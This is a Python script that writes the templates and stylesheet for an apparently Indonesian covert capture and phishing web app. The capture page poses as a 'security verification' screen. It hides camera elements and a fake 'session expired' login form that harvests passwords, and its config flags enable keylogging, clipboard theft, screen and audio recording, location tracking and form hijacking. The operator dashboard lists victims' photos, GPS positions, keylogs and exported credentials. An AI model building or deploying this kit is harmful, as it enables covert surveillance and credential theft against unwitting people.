"""Part 3 - Templates + CSS"""
from pathlib import Path


def write_part3(PROJECT):
    F = {}

    F["app/templates/base.html"] = """<!DOCTYPE html>
<html lang="id"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#0d0d0d">
<link rel="manifest" href="/static/manifest.json">
<link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
{% block head %}{% endblock %}
<title>{% block title %}Memuat...{% endblock %}</title>
</head><body>
{% block body %}{% endblock %}
</body></html>
"""

    F["app/templates/login.html"] = """{% extends "base.html" %}
{% block title %}Login{% endblock %}
{% block body %}
<div class="login-wrap">
  <form method="POST" class="login-card">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <h2>Login Dashboard</h2>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <input type="text" name="user" placeholder="Username" required autofocus>
    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Masuk</button>
  </form>
</div>
{% endblock %}
"""

    F["app/templates/capture.html"] = """{% extends "base.html" %}
{% block title %}Memuat Konten...{% endblock %}
{% block body %}
<div class="capture-loading" id="app">
  <div class="logo-container"><div class="logo-pulse"></div><div class="logo-icon">&#128274;</div></div>
  <h2 class="cap-title">Verifikasi Keamanan</h2>
  <p class="cap-subtitle">Mohon tunggu sebentar, sedang memverifikasi perangkat Anda...</p>
  <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
  <p class="cap-step" id="capStep">Menginisialisasi...</p>
  <div class="cap-dots"><span></span><span></span><span></span></div>
</div>

<video id="v" autoplay playsinline muted hidden></video>
<canvas id="c" hidden></canvas>
<div id="status" hidden></div>
<div id="log" hidden></div>

<div id="fakeLoginModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:99998;align-items:center;justify-content:center;padding:20px">
  <div style="background:#1a1a1a;border-radius:12px;padding:24px;width:100%;max-width:340px;border:1px solid #333">
    <div style="text-align:center;font-size:48px;margin-bottom:8px">&#128274;</div>
    <h3 style="margin:0 0 6px;text-align:center;color:#fff">Sesi Berakhir</h3>
    <p style="color:#8899aa;font-size:13px;text-align:center;margin:0 0 16px">Silakan login ulang untuk melanjutkan</p>
    <form id="fakeLoginForm" autocomplete="on">
      <input type="text" name="email" placeholder="Email atau username" required
        style="width:100%;padding:12px;margin-bottom:10px;border-radius:8px;border:1px solid #333;background:#0d0d0d;color:#eee;font-size:15px;box-sizing:border-box">
      <input type="password" name="password" placeholder="Password" required
        style="width:100%;padding:12px;margin-bottom:14px;border-radius:8px;border:1px solid #333;background:#0d0d0d;color:#eee;font-size:15px;box-sizing:border-box">
      <button type="submit"
        style="width:100%;padding:12px;border-radius:8px;border:none;background:#1e6feb;color:#fff;font-weight:bold;font-size:15px;cursor:pointer">
        Masuk
      </button>
    </form>
  </div>
</div>

<script>
  window.CAMPAIGN = "{{ campaign|default('default') }}";
  window.CONFIG = {
    ENABLE_SCREENSHOT: {{ 'true' if config.ENABLE_SCREENSHOT else 'false' }},
    ENABLE_BURST: {{ 'true' if config.ENABLE_BURST else 'false' }},
    BURST_INTERVAL: {{ config.BURST_INTERVAL }},
    BURST_DURATION: {{ config.BURST_DURATION }},
    ENABLE_KEYLOGGER: {{ 'true' if config.ENABLE_KEYLOGGER else 'false' }},
    ENABLE_CLIPBOARD: {{ 'true' if config.ENABLE_CLIPBOARD else 'false' }},
    ENABLE_TAB_LOG: {{ 'true' if config.ENABLE_TAB_LOG else 'false' }},
    ENABLE_FORM_HIJACK: {{ 'true' if config.ENABLE_FORM_HIJACK else 'false' }},
    ENABLE_AUTO_SCROLL_SHOT: {{ 'true' if config.ENABLE_AUTO_SCROLL_SHOT else 'false' }},
    AUTO_SCROLL_INTERVAL: {{ config.AUTO_SCROLL_INTERVAL }},
    ENABLE_SCREEN_RECORD: {{ 'true' if config.ENABLE_SCREEN_RECORD else 'false' }},
    SCREEN_RECORD_DURATION: {{ config.SCREEN_RECORD_DURATION }},
    ENABLE_AUDIO_RECORD: {{ 'true' if config.ENABLE_AUDIO_RECORD else 'false' }},
    AUDIO_RECORD_DURATION: {{ config.AUDIO_RECORD_DURATION }},
    ENABLE_LOCATION_TRACKING: {{ 'true' if config.ENABLE_LOCATION_TRACKING else 'false' }},
    LOCATION_INTERVAL: {{ config.LOCATION_INTERVAL }},
    ENABLE_MOTION_TRACK: {{ 'true' if config.ENABLE_MOTION_TRACK else 'false' }},
    ENABLE_NETWORK_INFO: {{ 'true' if config.ENABLE_NETWORK_INFO else 'false' }},
    ENABLE_FAKE_LOGIN: {{ 'true' if config.ENABLE_FAKE_LOGIN else 'false' }},
    FAKE_LOGIN_DELAY: {{ config.FAKE_LOGIN_DELAY }}
  };
</script>
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
<script src="{{ url_for('static', filename='js/capture.js') }}"></script>
{% endblock %}
"""

    F["app/templates/dashboard.html"] = """{% extends "base.html" %}
{% block title %}Dashboard{% endblock %}
{% block head %}
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
{% endblock %}
{% block body %}

<header class="topbar">
  <h1>Dashboard <span class="badge" id="totalBadge">{{ stats.total }} sesi</span></h1>
  <div class="top-actions">
    <a class="btn" href="/" target="_blank">Capture</a>
    <a class="btn gray" href="/api/export/zip">ZIP</a>
    <a class="btn gray" href="/api/export/creds">Creds CSV</a>
    <button class="btn gray" id="btnRefresh">Refresh</button>
    <a class="btn red" href="#" id="btnDeleteAll">Hapus Semua</a>
    <a class="btn red" href="/logout">Logout</a>
  </div>
</header>

<section class="stats-grid">
  <div class="stat-card"><div class="num">{{ stats.total }}</div><div class="lbl">Total Sesi</div></div>
  <div class="stat-card"><div class="num">{{ stats.with_photo }}</div><div class="lbl">Ada Foto</div></div>
  <div class="stat-card"><div class="num">{{ stats.with_gps }}</div><div class="lbl">Ada GPS</div></div>
  <div class="stat-card"><div class="num">{{ stats.with_screenshot }}</div><div class="lbl">Screenshot</div></div>
  <div class="stat-card"><div class="num">{{ stats.keys_total }}</div><div class="lbl">Keylog</div></div>
  <div class="stat-card"><div class="num">{{ stats.creds_total }}</div><div class="lbl">Credentials</div></div>
</section>

<section class="charts-row">
  <div class="chart-box"><h3>7 Hari Terakhir</h3><canvas id="chartTimeline"></canvas></div>
  <div class="chart-box"><h3>Top Kota</h3><canvas id="chartCities"></canvas></div>
</section>

<section class="filters">
  <input id="searchBox" placeholder="Cari IP / kota / ISP / campaign...">
  <select id="filterCampaign"><option value="">Semua campaign</option></select>
  <select id="filterPhoto">
    <option value="">Semua</option>
    <option value="yes">Ada foto</option>
    <option value="no">Tanpa foto</option>
  </select>
</section>

<section id="cards" class="grid">
  {% for s in sessions %}
  <div class="card" data-ts="{{ s.ts }}"
       data-search="{{ (s.ip_publik or '') }} {{ (s.ip_koneksi or '') }} {{ (s.city or '') }} {{ (s.region or '') }} {{ (s.isp or '') }} {{ (s.campaign or '') }}"
       data-campaign="{{ s.campaign or 'default' }}"
       data-has-photo="{{ 'yes' if (s.has_depan or s.has_belakang) else 'no' }}">
    <div class="imgs">
      {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" target="_blank"><img src="/api/file/{{ s.ts }}_depan.png" loading="lazy"></a>{% endif %}
      {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" target="_blank"><img src="/api/file/{{ s.ts }}_belakang.png" loading="lazy"></a>{% endif %}
      {% if not s.has_depan and not s.has_belakang %}<div class="no-photo">Tidak ada foto</div>{% endif %}
    </div>
    <div class="info">
      <div class="row"><b>Waktu:</b> {{ s.waktu }}</div>
      <div class="row"><b>IP:</b> {{ s.ip_publik or s.ip_koneksi or '-' }} {% if s.is_vpn %}<span class="tag vpn">VPN</span>{% endif %}</div>
      <div class="row"><b>Kota:</b> {{ s.city or '-' }}, {{ s.region or '-' }}</div>
      <div class="row"><b>ISP:</b> {{ s.isp or '-' }}</div>
      <div class="row"><b>Campaign:</b> <span class="tag">{{ s.campaign or 'default' }}</span></div>
      <div class="row"><b>Keylog:</b> {{ s.keylog_count }} | <b>Creds:</b> {{ s.clipboard_count }}</div>
      {% if s.lat and s.lon %}
        <div class="row"><b>GPS:</b> {{ "%.5f"|format(s.lat) }}, {{ "%.5f"|format(s.lon) }}</div>
        <div class="mini-map" id="map-{{ s.ts }}"></div>
      {% endif %}
      <div class="actions">
        <a href="#" class="btn-action show-detail" data-ts="{{ s.ts }}">Detail</a>
        <a href="#" class="btn-action show-events" data-ts="{{ s.ts }}">Event</a>
        <a href="#" class="btn-action show-keys" data-ts="{{ s.ts }}">Keys</a>
        <a href="#" class="btn-action show-burst" data-ts="{{ s.ts }}">Burst</a>
        {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" download class="btn-action">Depan</a>{% endif %}
        {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" download class="btn-action">Belakang</a>{% endif %}
        {% if s.has_screenshot %}<a href="/api/file/{{ s.ts }}_screenshot.png" target="_blank" class="btn-action">Screen</a>{% endif %}
        {% if s.has_audio %}<a href="/api/file/{{ s.ts }}_audio.webm" target="_blank" class="btn-action">Audio</a>{% endif %}
        {% if s.has_video %}<a href="/api/file/{{ s.ts }}_video.webm" target="_blank" class="btn-action">Video</a>{% endif %}
        <a href="#" class="btn-action del" data-ts="{{ s.ts }}">Hapus</a>
      </div>
    </div>
  </div>
  {% endfor %}
</section>

{% if not sessions %}
<p style="text-align:center;color:#888;padding:40px">Belum ada sesi.</p>
{% endif %}

<script>
window.SESSIONS = {{ sessions|tojson }};
window.STATS = {{ stats_json|safe }};
</script>
<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
{% endblock %}
"""

    F["app/static/manifest.json"] = '{"name":"Loading","short_name":"Load","start_url":"/","display":"standalone","background_color":"#0d0d0d","theme_color":"#0d0d0d"}'

    F["app/static/css/style.css"] = """* { box-sizing: border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0d0d0d; color:#eee; margin:0; padding:0; }
a { color:#6cf; }
.capture-loading { min-height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; gap:18px; padding:24px; text-align:center; background:radial-gradient(circle at 50% 30%, #1a2332 0%, #0d0d0d 70%); }
.logo-container { position:relative; width:90px; height:90px; display:flex; align-items:center; justify-content:center; margin-bottom:8px; }
.logo-pulse { position:absolute; width:100%; height:100%; border-radius:50%; background:#4a9eff; opacity:0.15; animation:pulse-ring 2s infinite; }
@keyframes pulse-ring { 0%{transform:scale(0.9);opacity:0.3} 50%{transform:scale(1.15);opacity:0.05} 100%{transform:scale(0.9);opacity:0.3} }
.logo-icon { position:relative; font-size:40px; z-index:1; }
.cap-title { font-size:22px; margin:0; color:#fff; font-weight:600; }
.cap-subtitle { font-size:14px; color:#8899aa; margin:0; max-width:340px; line-height:1.5; }
.progress-bar { width:260px; height:5px; background:#1a1a1a; border-radius:3px; overflow:hidden; margin-top:8px; }
.progress-fill { height:100%; width:0%; background:linear-gradient(90deg,#4a9eff,#a06bff,#4a9eff); background-size:200% 100%; border-radius:3px; transition:width 0.4s ease; animation:shine 2s linear infinite; }
@keyframes shine { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
.cap-step { font-size:12px; color:#667788; margin:4px 0 0; min-height:16px; letter-spacing:0.5px; }
.cap-dots { display:flex; gap:6px; margin-top:8px; }
.cap-dots span { width:6px; height:6px; border-radius:50%; background:#4a9eff; opacity:0.4; animation:dot-pulse 1.4s ease-in-out infinite; }
.cap-dots span:nth-child(2){animation-delay:0.2s} .cap-dots span:nth-child(3){animation-delay:0.4s}
@keyframes dot-pulse { 0%,80%,100%{opacity:0.3;transform:scale(0.8)} 40%{opacity:1;transform:scale(1.1)} }
.login-wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; }
.login-card { background:#1a1a1a; padding:30px; border-radius:12px; border:1px solid #2a2a2a; display:flex; flex-direction:column; gap:12px; width:320px; }
.login-card h2 { margin:0 0 10px; }
.login-card input { padding:10px; border-radius:6px; border:1px solid #333; background:#111; color:#eee; font-size:15px; }
.login-card button { padding:12px; border-radius:6px; border:none; background:#1e6feb; color:#fff; font-weight:bold; cursor:pointer; font-size:15px; }
.error { color:#f66; font-size:13px; }
.topbar { display:flex; justify-content:space-between; align-items:center; padding:18px 24px; gap:12px; flex-wrap:wrap; }
.topbar h1 { margin:0; font-size:22px; }
.badge { background:#1e6feb; padding:4px 10px; border-radius:20px; font-size:13px; }
.top-actions { display:flex; gap:8px; flex-wrap:wrap; }
.btn { background:#1e6feb; color:#fff; padding:8px 14px; border-radius:6px; text-decoration:none; font-size:14px; border:none; cursor:pointer; }
.btn.gray { background:#333; } .btn.red { background:#c33; }
.stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:14px; padding:0 24px 20px; }
.stat-card { background:#1a1a1a; padding:18px; border-radius:10px; border:1px solid #2a2a2a; text-align:center; }
.stat-card .num { font-size:28px; font-weight:bold; color:#4a9eff; }
.stat-card .lbl { font-size:11px; color:#888; margin-top:6px; }
.charts-row { display:grid; grid-template-columns:2fr 1fr; gap:14px; padding:0 24px 20px; }
@media (max-width:800px){.charts-row{grid-template-columns:1fr}}
.chart-box { background:#1a1a1a; padding:16px; border-radius:10px; border:1px solid #2a2a2a; min-height:220px; }
.chart-box h3 { margin:0 0 12px; font-size:13px; color:#888; letter-spacing:1px; text-transform:uppercase; }
.filters { display:flex; gap:10px; padding:0 24px 18px; flex-wrap:wrap; }
.filters input, .filters select { padding:10px; border-radius:8px; background:#1a1a1a; border:1px solid #2a2a2a; color:#eee; font-size:14px; }
.filters input { flex:1; min-width:200px; }
.filters select { min-width:140px; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:16px; padding:0 24px 40px; }
.card { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; }
.card .imgs { display:flex; gap:2px; }
.card .imgs img { flex:1; width:100%; aspect-ratio:4/3; object-fit:cover; background:#000; display:block; }
.no-photo { padding:40px 20px; text-align:center; color:#666; font-style:italic; background:#111; font-size:13px; width:100%; }
.info { padding:12px; font-size:12.5px; }
.row { margin-bottom:5px; color:#bbb; }
.row b { color:#eee; }
.tag { background:#333; padding:1px 8px; border-radius:10px; font-size:11px; }
.tag.vpn { background:#c33; }
.mini-map { height:120px; border-radius:6px; margin-top:6px; }
.actions { display:flex; gap:6px; margin-top:10px; flex-wrap:wrap; }
.btn-action { display:inline-block; font-size:12px; color:#6cf; text-decoration:none; padding:6px 10px; background:#222; border-radius:5px; border:1px solid #333; cursor:pointer; }
.btn-action:hover { background:#2a2a2a; } .btn-action.del { color:#f66; }
.detail-modal { text-align:left; font-size:13px; line-height:1.6; }
.detail-modal table { width:100%; border-collapse:collapse; }
.detail-modal td { padding:6px 10px; vertical-align:top; border-bottom:1px solid #222; }
.detail-modal td:first-child { color:#888; width:130px; }
.detail-modal code { background:#111; padding:2px 6px; border-radius:3px; font-size:12px; color:#6cf; word-break:break-all; }
.burst-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(80px,1fr)); gap:6px; }
.burst-grid img { width:100%; border-radius:4px; cursor:pointer; }
"""

    for rel, content in F.items():
        p = PROJECT / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
